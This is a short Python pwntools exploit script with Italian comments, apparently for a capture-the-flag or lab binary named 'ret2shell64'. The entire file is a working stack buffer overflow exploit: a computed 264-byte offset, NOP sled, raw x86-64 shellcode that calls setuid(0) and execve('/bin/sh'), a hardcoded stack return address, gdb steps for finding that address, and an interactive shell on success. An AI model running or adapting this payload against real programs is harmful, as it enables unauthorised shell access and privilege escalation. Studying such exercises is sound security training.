from pwn import *

import sys

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./ret2shell64")

#pattern create e pattern search >>>> 264 bytes per raggiungere rsp
bytes_to_reach_rsp=264


#per trovarlo  IMPORTANTE !!!!!!!!!!!!!!!!!
#   APPENA AVVIATO fare disass vuln
#   METTERE b * indirizzo_leave
#   FARE c 
#   FARE x/300xg $rsp 
#0x7fffffffdee0
return_address = b'\xe0\xde\xff\xff\xff\x7f\x00\x00'

nops = b'\x90'*40 

padding = b'\x50'*40


shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

 
buf = b'\x55'* (bytes_to_reach_rsp - len(nops) - len(padding)- len(shellcode))

print(len(buf))

payload = buf + nops + shellcode + padding + return_address
p.recvuntil(b"Guess my name\n")
p.sendline(payload)
p.interactive()
#sys.stdout.buffer.write(buf+nops+payload+padding+return_address)


